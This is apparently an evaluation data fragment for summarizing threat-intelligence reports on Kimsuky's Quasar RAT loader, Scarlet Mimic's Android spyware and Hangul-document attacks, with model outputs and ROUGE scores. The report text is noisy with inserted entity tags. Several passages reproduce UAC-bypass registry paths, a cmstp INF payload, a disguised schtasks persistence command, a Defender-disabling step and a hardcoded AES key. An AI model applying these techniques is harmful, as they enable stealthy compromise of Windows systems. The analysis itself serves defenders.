malicious code is as follows.malware resource dataIf your Windows version is [ORG] 10Drop [ORG] & [ORG] Execute [ORG] Privilege [ORG] Elevation [ORG] SW ( TEXT114)If you have high privileges and [ORG] WinDefender is runningDefender [ORG] Control [ORG] SW [ORG] & [ORG] Execution ( TEXT116)Main Malicious Behavior ( TEXT115)Drop file with C2 information5/14elevation of privilegeMalware main logicThe malicious code decrypts the resource file ( TEXT116 ) , maps the file to memory , and calls the Export function [PERSON] Reg for privilege elevation.factor Privilege ElevationS / Wfile / registry pathOnecomputerdefaults.exe HKCU\\\\Software\\\\Classes\\\\ms - settings\\\\shell\\\\open\\\\command2345sdclt.execmstp.exeHKCU\\\\Software\\\\Classes\\\\Folder\\\\shell\\\\open\\\\command%AppData\\Microsoft\\windows\\seting.iniWSReset.exeHKCU\\\\Software\\\\Classes\\\\AppX82a6gwre4fdg3bt635tn5ctqjf8msdd2\\\\Shell\\\\open\\\\commandslui.exeHKCU\\\\Software\\\\Classes\\\\Launcher . [CARDINAL] SystemSettings\\\\shell\\\\open\\\\command6/14Privilege Elevation S / W[version ] Signature=$chicago$ AdvancedINF=2.5 [ DefaultInstall]CustomDestination = CustInstDestSectionAllUsers RunPreSetupCommands = RunPreSetupCommandsSection[RunPreSetupCommandsSection ] [ MALPATH]\\malware.dll , [PERSON] Run taskkill /IM cmstp.exe /F[CustInstDestSectionAllUsers ] [CARDINAL] 49000,49001 = AllUSer_LDIDSection , 7[AllUSer_LDIDSection ] \" HKLM \" , \" SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App [PERSON] Paths\\CMMGR32.EXE \" , \" ProfileInstallPath \" , ShortSvcName=\"WinPwnageVPN\"Turn off winDefenderSearch \" sMpEng \" string among running processes to check whether [PERSON] Defender is running , and if it is running , drop the file ( TEXT114 ) in the resource area and run it with the /D option to turn off [PERSON] Defender . Path : % PROGRAMFILES%\\Microsfot\\ File name : /[cetuikgbms]{6}.exe7/14win defender controlMalware installationThe final malicious code , Quasar RAT , and the encrypted C2 file are dropped to a fixed folder . Encrypted C2 ( BIN101 ): % AppData%\\Microsoft\\Office\\MsWord16.pip Quasar RAT ( BIN102 ): % AppData%\\Microsoft\\Office\\StaticCache.datThe loader running Quasar RAT creates a random folder in % AppData%\\Microsoft\\ , drops it to a random name , and runs it . Installation path : % AppData%\\Microsoft\\ [ pubs , Common , Defender , Protect , [ORG] Vault ] File name : [ svchost , sihost , spoolsv , taskhostw , RuntimeBroker].exe Execution argument : -startAutorun Registration ( Persistence)Attempts to register the scheduler and register the registry ( if [PERSON] Windefender is not running ) to secure the continuity of the malicious [ORG] code.8/14autorun [ORG] nameWindowsAutoUpdate [ORG] CloudUpdateschtasks.exe \" /create /tn \\\"WindowsAutoUpdate\\ \" /tr \\\"C:\\\\Users\\\\anon\\\\AppData\\\\Roaming\\\\Microsoft\\\\Protect\\\\svchost.exe -start\\ \" /sc [ORG] DAILY /mo [CARDINAL] 1 /f\"Registry Path : Path : HKLM\\SoftWare\\Microsoft\\Windows\\CurrentVersion\\RunRAT [PERSON] LoaderRAT [PERSON] Loader is a .NET - based loader program named teracom or [ORG] RuntimeBroker that reads Quasar - based malware , decodes it , and executes it . [ORG] PDB information exists in the loaded executable file . G:\\SRC\\!Spy\\!LoadAssembly\\!teracom\\teracom\\obj\\Release\\teracom.pdb G:\\SRC\\!Spy\\taskhost\\taskhost\\obj\\Release\\RuntimeBroker.pdbteracom / runtimebroker info9/14Malware based on [GPE] Quasar RATRAT loaderThe [ORG] StaticCache.dat file that operates in memory is a Quasar RAT - based malware with a package name of RMSSVC . The overall function is the same as Quasar RAT , so only some settings , decryption logic , and C2 address loading method will be reviewed . ( link : url ) [CARDINAL] 10/14RAT Package11/14Decrypt the encrypted C2 and AES - encrypted MsWord16.pip files in the [ORG] Config file and set them to C2Setting information to be used for malicious behaviorhttps : //blog.daum [ .]net / casalesmedia / pages / category [CARDINAL] 2 . [CARDINAL] 159 ( 0x9F ) XORC2 File Decryption Logic ( AES)def aes_dec(enc_str):enc_str = base64.b64decode(enc_str ) key = base64.b64decode(\"IuYp5htzIKk1wqlMrcwzSg== \" ) iv = \" [FAC] \\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00 \" decrypt = AES.new(key , AES.MODE_CBC , IV= iv ) dec_str = decrypt.decrypt(enc_str ) print(dec_str)conclusionI'm just sorry for wasting your time by bringing all the finished rice cakes . But I wrote it with the hope that it might be helpful to someone . And I probably wo n't be posting any more tracking or analysis posts about these friends after this one . ( The reason will be written later along with the current situation on personal [GPE] SNS.)I end this article by sending a review to all malware / threat analysts who are struggling day and [TIME] night to identify and block threats . Goodbye [DATE] 2020 ! And [PERSON] Happy [PERSON] New year!!IOCCase 1 . API Name En / Decoding logic is added golddragon / braveprince malware [CARDINAL] 237DEBA138355BFB448E74BFB68FC868F4807B24D68715A6D47E348FC0CF925713/14Case [CARDINAL] 2 . [PRODUCT] the [PRODUCT] Information [PRODUCT] Stealer SHA256 : [CARDINAL] 5E3907E9E2ED8FF12BB4E96B52401D871526C5ED502D2149DD4F680DA4925590Case [CARDINAL] 3 . .Net based malware on Quasar RAT sha1 : E8BEF41ED7D0704D9206880EE0F30B5ECF30F204 SHA256 : [CARDINAL] 0CF7E1268E8652D841B7BDA784707E445B9CDC2A46FFB375C8F239CB4C551F7314/14", "generated_text": "the golddragon/braveprince; the kimsuky; Thallium; information; randint; randint.exe; the run function; svchost.exe; iexplorer.exe; the API names; a routine; API name en/decoding; a code; the RAT; a routine; API name decryption; the command; the C2; control; the tool; the key; the Run function; the randint; a routine; the code; the golddragon/braveprince command.", "ref_text": "<START-1>The document analyzes recent activity by the North Korean threat actor group Kimsuky, also known as Golddragon or Braveprince. It first looks at malware from the Golddragon/Braveprince cluster that steals information and communicates with a command and control server. This malware now includes a routine to encode API names to evade detection. The second sample is an information stealer that gathers system data, account credentials from browsers, and exfiltrates the information. This appears to be a module used by other Kimsuky malware. The third sample leverages the open source Quasar RAT. It uses privilege escalation techniques to disable Windows Defender before dropping the RAT payload. This payload communicates with C2 servers and has code similarities to previous Kimsuky malware. In summary, the analysis examines three new malware samples attributed to the Kimsuky group based on code reuse, tactics, and other similarities to known activity. It highlights the ongoing evolution of their malware to gather data from compromised systems and communicate with command and control infrastructure. <END-1>", "t5/keyword/hint_hit_precision": 0.0, "gpt3/lexical/rouge_rouge1": 0.4379084967320262, "gpt3/lexical/rouge_rouge2": 0.12500000000000003, "gpt3/lexical/rouge_rougeL": 0.261437908496732, "gpt3/lexical/rouge_rougeLsum": 0.261437908496732, "gpt3_generated_text": ["The article discusses recent attacks carried out by the golddragon/braveprince cluster of the kimsuky (aka Thallium) group. These attacks involve malware that steals information and creates svchost.exe and iexplorer.exe processes to steal information via daum mail. The malware has recently added a routine to encrypt/decrypt DLL and API names. The encoded names are decoded using a specific formula and a key table. The article also mentions an information stealer malware that saves system information and steals user information stored in web browsers. This malware does not transmit the collected information and appears to be one of the system information collection modules executed by other malicious codes. Additionally, the article mentions a .Net malware based on the Quasar RAT that was found during an intelligence search. The dropper running the Quasar RAT has a complex resource structure."]}, {"split_name": "val", "sample_id": "val_39", "prompt_text": "Extract the keywords: research.checkpoint.com /2022 / never - truly - left-7 - years - of - scarlet - mimics - mobile - surveillance - campaign - targeting - uyghurs/ [DATE] 7 [DATE] Years [DATE] of [DATE] Scarlet [DATE] Mimic \u2019s [DATE] Mobile [DATE] Surveillance Campaign Targeting Uyghurs \u22ee [DATE] 9/22/2022September 22 , [DATE] 2022 [DATE] IntroductionIn [DATE] 2022 , [ORG] Check [ORG] Point [ORG] Research ( [ORG] CPR ) observed a new wave of a long - standing campaign targeting the [PERSON] Uyghur community , a [ORG] Turkic ethnic group originating from [LOC] Central [LOC] Asia , [CARDINAL] one of the largest minority ethnic groups in [GPE] China . This malicious activity , which we attributed to the threat actor [PERSON] Scarlet [PERSON] Mimic , was [ORDINAL] first brought to light back in [CARDINAL] 2016.Since then , [ORG] CPR has observed the group using [CARDINAL] more [CARDINAL] than [CARDINAL] 20 different variations of their [ORG] Android malware , disguised in multiple [ORG] Uyghur - related baits such as books , pictures , and even an audio version of the [NORP] Quran , the holy text of the [NORP] Islamic faith . The malware is relatively unsophisticated from a technical standpoint . However , its capabilities allow the attackers to easily steal sensitive data from the infected device , as well as perform calls or send an SMS on the victim \u2019s behalf and track their location in real - time . Also , it allows audio recording of incoming and outgoing calls , as well as surround recording . All this makes it a powerful and dangerous surveillance tool . In this report , we present a technical analysis and describe the evolution of the campaign in [DATE] the [DATE] last [DATE] seven [DATE] years . Although a small part of this campaign was briefly discussed in Cyble \u2019s publication as an isolated and unattributed incident , in this article we put the whole campaign in perspective and outline almost a [DATE] decade \u2019s worth of persistent efforts in phone surveillance of the [ORG] Uyghur community . Overview of the campaign1/21Since [DATE] 2015 , [ORG] CPR has identified [CARDINAL] more [CARDINAL] than [CARDINAL] 20 samples of [ORG] Android spyware called [ORG] MobileOrder , with the latest variant dated mid - [DATE] August [DATE] 2022 . As there are no indications that any of them were distributed from the Google Store , we can assume the malware is distributed by other means , most likely by social engineering campaigns . In most cases , the malicious applications masquerade as [ORG] PDF documents , photos , or audio . When the victim opens the decoy content , the malware begins to perform extensive surveillance actions in the background . These include stealing sensitive data such as the device info , SMS and calls , the device location , and files stored on the device . The malware is also capable of actively executing commands to run a remote shell , take photos , perform calls , manipulate the SMS , call logs and local files , and record the surround sound . Figure [CARDINAL] 1 \u2013 [ORG] MobileOrder malware samples observed in the wild . All the samples are based on the code of the [ORG] MobileOrder malware from [DATE] 2015 , although during the ensuing [DATE] years some changes were introduced by the developers . A few of these changes were clearly developed to reduce the chances of the malware being detected by security solutions : the malware authors experimented with ways to hide the malicious strings ( which indicate the malware \u2019s intentions ) , [ORDINAL] first by moving them to the resources section , and later encoding them in base64.The actors also added a few adjustments and features to gather more information from their victims \u2019 devices . [CARDINAL] One new aspect is to move from using [ORG] AMAP SDK , an [ORG] Android [ORG] SDK used to identify geolocation , to using the standard Android LocationListener implementation . This allows the attackers to track their target \u2019s location in real - time instead of an on - demand basis.2/21Figure 2 \u2013 Evolution of the [ORG] Android malware . The [ORG] MobileOrder malware , despite being actively used and updated , still does not support modern [ORG] Android OS features , such as runtime permissions or new intent for APK installation , and does not use techniques common to most modern malware such as accessibility usage , avoiding battery optimization , etc . We are not able to identify which attacks have been successful , however , the fact that the threat actors continue to develop and deploy the malware for [DATE] so [DATE] many [DATE] years suggests that they have been successful in at least some of their operations . Technical analysisWhen the victim opens the lure , whether it is a document , picture , or audio file , it actually launches the malicious application , which in turn opens a decoy document to distract the victim from background malicious actions . Some of the versions also ask for Device Admin and root access , which not only gives the malware full access to the device , but also prevents the victim from easily uninstalling the application : Figure [CARDINAL] 3 \u2013 Device admin activation and superuser [ORG] request.3/21The malware then hides its icon and launches [CARDINAL] two services : core and open . The open service is responsible for showing the victim the decoy content ( a [ORG] PDF file or an image or an audio record ) which is stored in res / raw/ , res / drawable/ or assets : Figure [CARDINAL] 4 \u2013 Malware code that displays a decoy picture from [DATE] February [DATE] 2022 version . The core service launches the Communication thread , which connects to the [ORG] C&C ( command & control ) server and processes the commands received , and the [FAC] KeepAlive thread , which periodically triggers a connection to the server and relaunches the parent service . Figure [CARDINAL] 5 \u2013 The service that starts the [ORG] Communication and [ORG] KeepAlive threads . However , the [FAC] KeepAlive thread is not the only one responsible for keeping the malware active . The malware developer also created [ORG] BroadcastReceiver that starts the core [ORG] Service . The triggers for this receiver are numerous actions registered in the [ORG] AndroidManifest , making sure the malware stays active all the time.4/21Figure 6 \u2013 [ORG] AndroidManifest.xml specifying triggers for the [ORG] BroadcastReceiver which is responsible for keeping the malware alive . C&C CommunicationDepending on the sample , the malware can use a hardcoded list of [ORG] C&C servers , dead drop resolvers , or both . [ORDINAL] First , the malware starts the process of resolving the [ORG] C&C server , which includes decoding the built - in [ORG] C&C addresses and , where it is defined , extracting the [ORG] C&C server from dead drop resolvers which point to additional [ORG] C&C infrastructure.5/21Figure [CARDINAL] 7 \u2013 The malware decodes the hardcoded [ORG] C&C domains and the [ORG] C&C server from the dead drop resolver . The use of dead drop resolvers helps prevent the infrastructure from being easily discovered through static analysis , but also enables operational resiliency as this infrastructure may be dynamically changed . All the versions of the malware that make use of dead drop resolvers query different posts on the [NORP] Chinese Sina blog platform . Dead drop resolversFirst , the malware requests a specific blog page : Figure [CARDINAL] 8 \u2013 Dead drop resolver on a Sina blog post . Then it searches the received HTML for a specific base64 - encoded regex pattern and decodes it to get the real The malware then creates a socket connection to the specified [ORG] IP and port . EncryptionTo secure communication with the [ORG] C&C server , the malware encrypts the data with [ORG] AES . The key is generated in runtime from an encrypted passphrase inside dex by calculating the MD5 digest : Figure 10- AES key generation . Command executionAfter successfully connecting to the [ORG] C&C , the malware processes commands from the remote server . It [ORDINAL] first reads a command , then an argument size , and finally the actual encrypted arguments . This is the full list of [PERSON] commands:7/21Command [PERSON] Send a list of files from the specific path . Send a list of processes running on the device . Send device and connectivity information ( [ORG] IMEI , [ORG] Phone [ORG] Number , Network type , [NORP] Accounts , Installed applications , [PERSON] Browser history and others ) . Delete specific files on the device . Upload files from a specified path on the device to the [ORG] C&C server . Download files from the [ORG] C&C server ( any file type ) . Upload all SMS messages . [ORG] Upload [ORG] all [ORG] Contacts . Upload all Call Logs . Take a photo from the camera . Start [PERSON] Audio [PERSON] Recording task ( immediately or at a specified time ) . Start \u201c Network \u201d location updates and send cell location info immediately . Start \u201c GPS \u201d location updates . Install APK ( silently or via [ORG] UI ) . Uninstall the application ( silently or via [ORG] UI ) . Execute \u201c chmod -R [CARDINAL] 777 \u201d to a specific path via su . Launch a specific application on the device . [PERSON] Send [PERSON] Broadcast with a specific action to trigger other applications . Run shell command . Change the minimal time interval between a location updates . Disable location tracking . Check if a screen is on . Send SMS to a specific number . Delete specific SMS . Perform call to a specific number . Delete a specific call log . Update the [ORG] C&C list . Take a screenshot . As we can see from this list , the malware contains stealer functionality to upload all kinds of sensitive data from the device ( device info , SMS , calls , location , etc . ) , but also provides RAT functionality by executing active commands on the device such as remote shell , file downloading , taking photos , performing calls , manipulating the SMS and call logs , etc . In the next sections , we analyze the most important functions . SMS and [ORG] Call [ORG] Logs manipulationThe malware has commands to upload all the SMS and call logs to the attackers \u2019 server . In addition , it provides the functionality to send text messages or perform a call to a specific number . This allows the actors to conduct further malicious activity against additional targets by impersonating the current victim , using his name , phone number and credibility . This drastically increases the chances of success . To hide these actions from the victim , the attackers may use commands to remove the last messages or call logs so that no traces of their interactions with [ORDINAL] third parties are left on the device.8/21Figure 11- [PERSON] Malware code responsible for running calls / sending SMS from a victim \u2019s device and functions to cover the evidence of these actions . Location trackingThe malware can collect the victim \u2019s device location and track its changes over time . When it is launched , the malware registers a location listener , which means [ORG] Android will trigger this listener every time the location is changed . The malware collects latitude , longitude , altitude , speed , bearing , accuracy , and the provider ( GPS or network ) that supplied these results . It also tries to convert the current location from latitude and longitude coordinates to a physical address using the Geocoder class . The number of details and the precision of this reverse geocoding process may vary . For example , one set of coordinates can be translated to the full street address of the closest building , while another might contain only a city name and a postal code . The geolocation data is immediately sent by the spyware to the remote server . Additionally , the malicious application also writes this data with a timestamp to the file called map.dat , thereby continuously collecting and saving the victim \u2019s geolocation . Even if the internet connection on a victim \u2019s devices or to the [ORG] C&C server is unavailable , the file with all the geolocation information is continuously updated and is uploaded to the attacker- controlled server when the connection is restored.9/21Figure [CARDINAL] 12 \u2013 [ORG] Location updates processing and reverse geocoding . The attackers can also configure the [ORG] Location listener parameters remotely : Change the minimal interval between the location updates \u2013 This allows the actors to decrease the number of updates but can still track the victim . Change the provider for location tracking between GPS ( based on satellite usage ) or network ( based on the availability of cell towers and [PERSON] WiFi access points).Before the malware developers started to utilize the standard Android LocationListener , the malware used a third- party [ORG] SDK called [ORG] AMAP to track the victim \u2019s location . The overall idea is similar : when the malicious app receives a command from the attackers \u2019 server to start tracking the device \u2019s location , it subscribes to location updates from the AMAP SDK . This way , at every location change , the malware writes the current location with a timestamp to the map.dat file and stores it as a variable.10/21Figure [CARDINAL] 13 \u2013 Device location tracking in the versions that use the [ORG] AMAP SDKAs a result , the attackers can send commands from the remote server to read the current location or to request a full tracking file . To summarize , in the most recent versions , the malware developers added the ability to track their target \u2019s location in real - time . The malware sends location updates on its own , compared to previous versions where the server needed to send additional commands to get the location information . Call recording and file uploadTo record both incoming and outgoing calls from the infected device \u2019s microphone , the malware uses a [ORG] BroadcastReceiver called [PRODUCT] CallRecorder . It monitors the phone state and saves the call records locally to the db file , so that it can be uploaded later to the attacker - controlled remote server by issuing the \u201c upload file \u201d command.11/21Figure [CARDINAL] 14 \u2013 The malware code responsible for recording the incoming and outgoing calls . Surround recordingBesides recording incoming and outgoing calls , the attackers can start surround recording remotely by issuing a relevant command from the [ORG] C&C server . When the command is received , the malware gets as an argument the desired duration and the specified delay before the recording starts . If there is no delay specified , it launches a thread that immediately starts to record . Otherwise , it creates a PendingIntent for the [ORG] BroadcastReceiver that is registered in [ORG] AlarmManager \u2013 and as a result , triggers a recording in the specified time.12/21Figure [CARDINAL] 15 \u2013 Starting audio recordings . After the AudioRecording thread performs the recording with the specified duration , it saves it to the db file with the timestamp : Figure [CARDINAL] 16 \u2013 [ORG] Surround recording implementation . As the recorded files may be quite large , we would expect to see some restrictions in the code on how the resulting files are exfiltrated ( for example , upload the files only via Wi - Fi networks ) , but there are no such limitations in the code . However , there is no automatic upload for the recorded calls . The attackers decide when to exfiltrate the files , so they could send a command to get device information ( which contains the current network connection type ) and then exfiltrate the files from the device when convenient . Because the attackers have updated information about the victim \u2019s location , they can choose the opportune moment to record offline private conversations , which affects not only the victim \u2019s privacy but also that of unsuspecting [ORDINAL] third parties . Remote shellThe malware can receive commands to execute a remote shell , which is done by starting a thread that , in turn , starts a shell process and establishes a socket connection to the same [ORG] C&C server , but over a different port . The shell \u2019s output is redirected to the socket output stream from which the malware reads the commands , then decrypts and executes them:13/21Figure [CARDINAL] 17 \u2013 Remote shell execution . Drop additional APKWhen it receives a command to install an [ORG] APK , the malware starts a thread that checks if it has enough privileges to install the application silently . If the check fails , the malware launches a regular [ORG] UI installation via intent:14/21Figure [CARDINAL] 18 \u2013 Silent apk installation via PackageManager . Uninstalling an application performs exactly the same logic . [ORG] AttributionThe [ORDINAL] first report that summarized the activity of Scarlet Mimic and various elements of this threat was published in [DATE] 2016 . It reviewed a series of persistent attacks that targeted [LOC] Uyghur and [NORP] Tibetan minority rights activists as well as those who support their cause . The group \u2019s arsenal at that point included multiple [NORP] Trojans and tools for Windows and macOS . In [DATE] 2015 , the actors started to expand their espionage efforts from PCs to mobile devices using the spyware called [ORG] MobileOrder , which focused on compromising [ORG] Android devices . Based on the code similarity , shared infrastructure and victimology , we conclude that the new wave of attacks belongs to the same threat actor and that the group continues to deploy and develop [ORG] MobileOrder malware until [DATE] this [DATE] day . In addition to clear code overlaps , we observed multiple overlaps in the infrastructure between the new samples and the old [ORG] MobileOrder malware variant , as well as multiple variants of [FAC] Windows [FAC] Psylo [FAC] Trojan previously attributed to [GPE] Scarlet [GPE] Mimic , that interact with the same malicious domains as the mobile malware . In [DATE] late [DATE] 2017 , Lookout research published their report on another cluster of malicious activity , which relied on JadeRAT Android malware to target the [PERSON] Uyghur community . This campaign \u201c had some overlap [ with [ORG] ScarletMimic ] around the apps they trojanized , the likely groups they targeted , their capabilities , and to some extent their implementation . \u201dTogether with the evidence of the ongoing campaign using [ORG] Android spyware provided in this report , this emphasizes the heavy shift of activity targeting these minority groups towards mobile surveillance in [DATE] the [DATE] last [DATE] few [DATE] years . Code overlaps15/21The [ORG] MobileOrder from the [DATE] 2015 report also started by registering itself as a device admin with admin privileges to admin privileges vs the sample from [DATE] April [DATE] 2020 performing the same request ( right)The [DATE] 2015 version of [ORG] MobileOrder masqueraded as a [ORG] PDF document , with an embedded [ORG] PDF called [PRODUCT] rd.pdf in the application \u2019s resources . This is similar to all the new samples in the ongoing campaign where the decoy content is [ORG] PDF files . The bait [ORG] PDF extracted from the malware resources is written to the device \u2019s SD card and displayed to the victim while executing the malicious actions in the background : Figure [CARDINAL] 20 \u2013 APK structure and the decoy [ORG] PDF file location in [DATE] 2015 sample of [ORG] MobileOrder and [DATE] August [DATE] 2022 sample ( right).The main communication thread , which is responsible for communicating with a [ORG] C&C server via socket and processing received commands , also did not change much over time , although many of the commands themselves changed the command i d , and a few more functionalities were added.16/21Figure 21 \u2013 Command processing in [ORG] MobileOrder from [DATE] 2015 vs commands processing in newer samples ( deobfuscated code ) . Victimology and luresMost of the malicious applications we observed have names in [LOC] the [LOC] Uyghur [LOC] language , in its [LANGUAGE] Arabic or [NORP] Latin scripts . They contain different decoys ( documents , pictures , or audio samples ) with content related to the ethnic geopolitical conflict centered on [ORG] Uyghurs in [GPE] China \u2019s far - northwest region of [GPE] Xinjiang , or with the religious content referencing the [ORG] Uyghurs \u2019 [NORP] Muslim identification . We can therefore conclude that this campaign is likely intended to target the [LOC] Uyghur minority or organizations and individuals supporting them , which is consistent with [ORG] the [ORG] Scarlet [ORG] of [ORG] Elqut [ORG] Alim , the \u201c New Chief Media Officer \u201d of [ORG] the [ORG] Norwegian [ORG] Youth [ORG] Union who call themselves \u201c a group of [ORG] Uyghur youth who live in [GPE] Norway with a common understanding and a common goal , which is to stand up against [GPE] China \u2019s invasion of [LOC] East [LOC] Turkestan . \u201d The malware was uploaded to [GPE] VT with the name in [GPE] Uyghur contains multiple pictures referring to the escalated tensions in [GPE] Xinjiang [GPE] Uygur [GPE] Autonomous [GPE] Region in [DATE] May [DATE] 2014 , including the deployment of special police forces next to [ORG] the [ORG] Urumqi [ORG] Railway [ORG] Station and the medical as a partial [ORG] PDF of the book with the same name written by [PERSON] Dolkun [PERSON] Isa , politician and activist from the region of [GPE] Xinjiang and the current president of [ORG] the [ORG] World [ORG] Uyghur [ORG] Congress:19/21Figure [ORG] 25 \u2013 The cover of the lure PDF.The sample called \u201c quran kerim \u201d which translates as \u201c [WORK_OF_ART] Noble [WORK_OF_ART] Quran \u201d ( md5 : be a [ORG] Turkic language . Some of the other lures include the pictures of unidentified individuals , and as reverse search engines fail to trace their origin , we can assume that these pictures are borrowed from the private profiles of these individuals in some social networks or were stolen from their mobile devices as a result of the spyware deployment . It \u2019s interesting that [CARDINAL] one of the samples , called \u201c \ufe94\ufee4\ufe8b\ufe8e\ufed8\ufedf\u0627 \u201d ( \u201c The list \u201d in [LANGUAGE] Arabic ) with the package name [ORG] Uyghurs . The name and the lure of this application is in [LANGUAGE] Arabic , and the lure document contains a picture of a list of persons wanted by [ORG] Shabwah Governorate in [GPE] Yemen for threatening the security and stability of the province . This may indicate the additional targeting of individuals or organizations located in a different geographical zone and involved in another conflict . ConclusionOver [DATE] the [DATE] years , Scarlet Mimic strongly continues its espionage operations against the [ORG] Uyghur community using [ORG] Android malware . The persistence of the campaign , the evolution of the malware and the persistent focus on targeting specific populations indicate that the group \u2019s operations over [DATE] the [DATE] years are successful to some extent . This threat group \u2019s shift in their attack vector into the mobile sector provides another evidence of a growing tendency of extensive surveillance operations executed on mobile devices as the most sensitive and private assets . Check [GPE] Point \u2019s [PERSON] Harmony [PERSON] Mobile helps securing mobile devices across all attack vectors : apps , network and OS and protects against [ORG] Android malware such as the one used on this campaign . [ORG] Harmony [ORG] Mobile leverages [ORG] Check [ORG] Point \u2019s [ORG] ThreatCloud and award - winning file protection capabilities to20/21block the download of malicious files to mobile devices and prevent file - based cyber - attacks , such as the one \u2019s described on this blog . fly100.dellgod[.]net islam.ansardawlatalislam[.]com k7k7[.]co mobile.muslimbro[.]org ziba.lenovositegroup[.]com 209.97.173[.]124 45.32.112[.]182 url url url url [PERSON] Dead drop resolver [PERSON] Dead drop resolver [PERSON] Dead drop resolver Dead drop resolverPackage Name com.emc.pdf pw.nrt.photo.google com.sy.go.immx com.pdf.google.vv com.pdf.google.vm com.pdf.google.vm com.pdf.google.vm com.photo.android.p com.update.google com.photo.android.p com.photo.android.p com.photo.android.p com.view.openpdf com.view.openpdf com.photo.android.p com.photo.android com.photo.android com.photo.android com.view.openpdf com.photo.android com.photo.android com.photo.android com.lppads.android21/21", "generated_text": "PDF; research; Check Point Research; Scarlet Mimic; mobile surveillance; the Uyghur community; Central Asia; PDF; photos; audio; commands; a remote shell; photos; calls; SMS; location; files; the Android malware; a decade; development; the MobileOrder malware; Android OS features; the Android malware; the Uyghur community; 2016; features; encryption; phone data; the campaign; security solutions; the development; the group; development; Human Rights; The analysis; the evolution; a decade; the campaign.", "ref_text": "<START-1>The PDF describes a 7-year long mobile surveillance campaign called Scarlet Mimic that has targeted the Uyghur minority community. The threat actor has used over 20 variations of Android spyware called MobileOrder disguised as Uyghur-related content like books, pictures, and audio files. The malware can steal sensitive data from infected devices like location, SMS, calls, files, and can also perform active commands like taking photos, recording audio, manipulating SMS/calls, and installing additional malware. The malware has evolved over time to evade detection, with the actors experimenting with hiding malicious strings in resources and encoding them. New features have also been added like real-time location tracking. The malware uses AES encryption to communicate with command and control servers, which can be hardcoded in the malware or retrieved from \"dead drop\" resolvers on blog sites. The actors have continuously updated the malware and used social engineering to distribute it through lures like Uyghur-related photos and documents, indicating an ongoing successful campaign. Based on code overlaps, infrastructure, and targeting, the campaign has been attributed to the Scarlet Mimic group which has previously targeted this community on Windows and MacOS. The shift to mobile malware aligns with a growing trend of mobile surveillance. The technical analysis provides an in-depth look at how the malware functions for exfiltrating data and manipulating the compromised device. <END-1>", "t5/keyword/hint_hit_precision": 0.0, "gpt3/lexical/rouge_rouge1": 0.5276381909547738, "gpt3/lexical/rouge_rouge2": 0.1717171717171717, "gpt3/lexical/rouge_rougeL": 0.2864321608040202, "gpt3/lexical/rouge_rougeLsum": 0.2864321608040202, "gpt3_generated_text": ["This article from Check Point Research discusses a mobile surveillance campaign targeting the Uyghur community in China that has been ongoing for seven years. The campaign, attributed to the threat actor Scarlet Mimic, involves the use of Android malware disguised as Uyghur-related baits such as books, pictures, and audio files. The malware is relatively unsophisticated but allows the attackers to steal sensitive data, make calls and send SMS on the victim's behalf, and track their location in real-time. The article provides a technical analysis of the campaign and highlights its evolution over the years. The malware, called MobileOrder, has undergone several variations and changes to evade detection by security solutions. The authors also added features to gather more information from the victims' devices. Despite not supporting modern Android OS features, the malware has been actively used and updated, suggesting successful operations by the threat actors. The article emphasizes the persistence and implications of the campaign, shedding light on almost a decade's worth of phone surveillance targeting the Uyghur community."]}, {"split_name": "val", "sample_id": "val_40", "prompt_text": "Extract the keywords: [DATE] Mar [DATE] 23 , 2018Targeted Attacks on [NORP] South [NORP] Korean OrganizationsAttacks Using Local Word ProcessorSep 2016 - Dec 2017Analysis Research Team , AhnLab Security Emergency Response Center ( ASEC)220 , [PERSON] Pangyoyeok - ro , Bundang [PERSON] - gu , Seongnam - si , Gyeonggi - do , Republic of [GPE] Korea , [DATE] 13493 | [PERSON] Tel : +82 ( 0)31 - 722 - 8000 | Fax : +82 ( 0)31 - 722 - 8901 | url \u00a9 AhnLab , Inc. All rights reservedTargeted Attacks on [NORP] South [NORP] Korean OrganizationsContentsSummary [CARDINAL] 3Overview [FAC] 4Attack [FAC] Methods [FAC] 4Types of Malicious [PERSON] Hangul [PERSON] Files [CARDINAL] 4Vulnerabilities 5JavaScript 5Encapsulated PostScript ( [ORG] EPS ) [CARDINAL] 6Embedded Objects [CARDINAL] 6Status of malicious [PERSON] Hangul document files 7Change in [ORG] Malware [ORG] Source [ORG] Codes Used in Hangul Document File Attacks 10Attack groups [CARDINAL] 10Group [ORG] A [ORG] - [ORG] Red [ORG] Eyes [ORG] 10Group [ORG] B [ORG] 12Group [ORG] C [ORG] 13Other [ORG] 15Response [ORG] and [ORG] Prevention 16Reference 16 \u00a9 [ORG] AhnLab , Inc. All rights reserved [CARDINAL] 2Targeted Attacks on [NORP] South [NORP] Korean [NORP] OrganizationsSummaryHangul ( also known as [PERSON] Hangul [PERSON] Word [PERSON] Processor or [ORG] HWP ) is a proprietary word processing application published by the [NORP] South [NORP] Korean company [ORG] Hancom [ORG] Inc [ORG] Hangul 's specialized support for the [NORP] Korean written language has gained its widespread use in [GPE] South [GPE] Korea , especially by the government . Malicious attackers targeting [GPE] Korea are now using [PRODUCT] Hangul files . This report is based on [ORG] AhnLab \u2019s analysis malicious [PRODUCT] Hangul files found over [DATE] 16 [DATE] months , from [DATE] September [DATE] 2016 [DATE] to [DATE] December [DATE] 2017 , and found the target of attack to be mainly employees of [GPE] North [GPE] Korea related businesses and virtual currency related business . The attack methods using [PRODUCT] Hangul files came in many forms : exploiting different vulnerabilities , [ORG] JavaScripts , Encapsulated [ORG] PostScripts ( [ORG] EPS ) , and embedded objects . Current attacks mainly use the [ORG] EPS method . [ORG] AhnLab analyzed the problem classifying the attack groups by attack target , attack method , and malware . The attackers can be divided into [CARDINAL] three groups , and [CARDINAL] two of the [CARDINAL] three groups are actively using [PRODUCT] Hangul files as a delivery mechanism . In the past , the attacks using [PRODUCT] Hangul files created and executed a backdoor , which exploited a Hangul vulnerability on the user 's computer . However , attacks found after [DATE] September [DATE] 2016 are mainly executed in the memory of a computer . This seems to be a technique to bypass behavior - based diagnostics of security solutions , which detect the creation of malware in document files . Fortunately , there is no new malware exploiting [LOC] Hangul \u2019s vulnerabilities since [DATE] the [DATE] second [DATE] half [DATE] of [DATE] 2016 . This means that the attacker is exploiting a vulnerability that has already been patched so the users can prevent attacks by simply conducting the latest [PERSON] Hangul security update . This , however , does not apply to the embedded object type of malware found in [GPE] Hangul files . \u00a9 AhnLab , Inc. All rights reserved 3Targeted Attacks on [NORP] South [NORP] Korean OrganizationsOverviewHangul ( also known as [PERSON] Hangul [PERSON] 